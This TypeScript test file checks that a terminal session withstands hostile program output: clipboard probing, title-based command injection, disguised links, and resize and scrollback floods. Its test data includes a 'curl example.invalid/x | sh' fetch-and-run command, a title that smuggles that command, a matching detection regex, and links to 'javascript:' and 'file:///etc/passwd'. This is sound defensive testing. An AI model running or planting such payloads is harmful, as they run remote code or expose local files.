/**
 * The hostile recordings of the corpus, fed to a terminal set up as the product sets it
 * up. The corpus itself shows what the engine does with its defaults; this shows what a
 * program can and cannot get out of a session's terminal with the product's limits on.
 */

import { readFileSync } from "node:fs";

import { hyperlinkAt, Vt, type ClipboardLocation } from "@lume/vt";
import { beforeAll, describe, expect, it } from "vitest";

import {
  LINK_SCHEMES_TO_CONFIRM,
  SCROLLBACK_DEFAULT_LINES,
  TITLE_MAX_BYTES,
} from "../src/limits.ts";
import { linkScheme } from "../src/terminal/links.ts";
import { TerminalSession } from "../src/terminal/session.ts";
import { sanitizeTitle } from "../src/terminal/title.ts";
import { DEFAULT_APPEARANCE, terminalColors } from "../src/theme.ts";
import { FakeAttachment } from "./fake-attachment.ts";

let vt: Vt;
beforeAll(async () => {
  let bytes: Uint8Array;
  try {
    bytes = readFileSync(new URL("../../vt/dist/ghostty-vt.wasm", import.meta.url));
  } catch {
    throw new Error("the terminal engine is not built. Run `cargo xtask vt wasm` first.");
  }
  vt = await Vt.instantiate(bytes);
});

/** What a hostile recording did to a session, as far as anything outside can tell. */
interface Outcome {
  readonly session: TerminalSession;
  readonly attachment: FakeAttachment;
  /** Everything the terminal sent to the program, joined. */
  readonly sent: string;
  readonly titles: readonly string[];
  readonly clipboard: readonly (readonly [string, ClipboardLocation])[];
}

/** Feeds a recording's bytes to a session's terminal, in pieces as output arrives. */
function feed(recording: string): Outcome {
  const input = readFileSync(
    new URL(`../../../tests/corpus/${recording}/input.bin`, import.meta.url),
  );
  const attachment = new FakeAttachment();
  const titles: string[] = [];
  const clipboard: [string, ClipboardLocation][] = [];
  const session = new TerminalSession(vt, attachment, {
    colors: terminalColors(DEFAULT_APPEARANCE),
    scheme: "dark",
    cellPx: { w: 8, h: 16 },
    hooks: {
      title: (title) => titles.push(title),
      clipboardWrite: (text, location) => clipboard.push([text, location]),
    },
  });
  session.start();
  // An odd piece size, so that sequences are cut in the middle as a real stream cuts them.
  for (let at = 0; at < input.length; at += 37) {
    attachment.data(input.subarray(at, at + 37));
  }
  return { session, attachment, sent: attachment.inputs.join(""), titles, clipboard };
}

/** What the recordings try to get typed back at the program. */
const INJECTED = /curl|example\.invalid|\| sh/;

describe("a program that goes for the clipboard", () => {
  it("is told nothing of what the clipboard holds", () => {
    const { session, sent } = feed("12-hostile-clipboard");
    // The only answer is a refusal, and it carries no text of anyone's.
    expect(sent).not.toMatch(INJECTED);
    expect(sent).not.toContain("]52;");
    session.dispose();
  });

  it("may offer text for the clipboard, which the view then decides about", () => {
    const { session, clipboard } = feed("12-hostile-clipboard");
    const texts = clipboard.map(([text]) => text);
    expect(texts).toContain("curl example.invalid/x | sh\n");
    // What was not base64 offered nothing.
    expect(texts).not.toContain("not base64 at all!");
    session.dispose();
  });
});

describe("a program that tries to have its own words typed back at it", () => {
  it("gets none of them back", () => {
    const { session, sent, attachment } = feed("13-hostile-title");
    expect(sent).not.toMatch(INJECTED);
    // The colour question is answered with the colour, whatever was set before it.
    const { r, g, b } = DEFAULT_APPEARANCE.foreground;
    const component = (value: number) => value.toString(16).padStart(2, "0").repeat(2);
    expect(sent).toContain(`rgb:${component(r)}/${component(g)}/${component(b)}`);
    expect(attachment.calls.filter((call) => call.startsWith("resize"))).toEqual([]);
    session.dispose();
  });

  it("has its title shown as text and nothing else", () => {
    const { session, titles } = feed("13-hostile-title");
    expect(titles).toEqual(['"; curl example.invalid/x | sh #']);
    expect(sanitizeTitle(titles[0]!)).toBe('"; curl example.invalid/x | sh #');
    session.dispose();
  });
});

describe("links that are not what they seem", () => {
  it("are offered only when their target is of a kind the shell opens", () => {
    const { session } = feed("14-hostile-links");
    const { terminal } = session;
    const target = (row: number) => hyperlinkAt(terminal, 0, row);

    // A script and inline data are never offered.
    expect(target(1)).toBe("javascript:alert(1)");
    expect(linkScheme(target(1))).toBeNull();
    expect(target(3)).toMatch(/^data:/);
    expect(linkScheme(target(3))).toBeNull();

    // A local file is offered only behind a question, however harmless its text looks.
    expect(terminal.rowText(2)).toBe("https://example.com/safe");
    expect(target(2)).toBe("file:///etc/passwd");
    expect(linkScheme(target(2))).toBe("file");
    expect(LINK_SCHEMES_TO_CONFIRM).toContain("file");

    expect(linkScheme(target(5))).toBe("https");
    session.dispose();
  });
});

describe("a program that pushes at every limit", () => {
  it("leaves the terminal as large as it was and still working", () => {
    const { session, attachment, sent } = feed("15-hostile-limits");
    const { terminal } = session;
    expect([terminal.cols, terminal.rows]).toEqual([80, 24]);
    // It asked for the window to change; the session was asked for nothing.
    expect(attachment.calls.filter((call) => call.startsWith("resize"))).toEqual([]);
    expect(sent).toBe("");
    expect(terminal.screenText().join("\n")).toContain("and the terminal is still standing");
    session.dispose();
  });

  it("gets no title longer than a title may be", () => {
    const { session, titles } = feed("15-hostile-limits");
    for (const title of titles) {
      expect(new TextEncoder().encode(sanitizeTitle(title)).length).toBeLessThanOrEqual(
        TITLE_MAX_BYTES,
      );
    }
    session.dispose();
  });

  it("keeps no more history than the limit, however much is printed", () => {
    const { session } = feed("16-scroll-flood");
    const { terminal } = session;
    expect(terminal.scrollbar().total).toBeLessThan(SCROLLBACK_DEFAULT_LINES * 1.2);
    expect(terminal.screenText().at(-1)).toBe("end");
    session.dispose();
  });
});

describe("a full reset", () => {
  it("takes away what a program left behind", () => {
    const { session, titles } = feed("17-full-reset");
    const { terminal } = session;
    expect(titles).toEqual(["left behind"]);
    expect(terminal.title()).toBe("");
    expect(terminal.pwd()).toBe("");
    expect(terminal.alternateScreen()).toBe(false);
    expect(terminal.screenText()[0]).toBe("after the reset");
    session.dispose();
  });
});
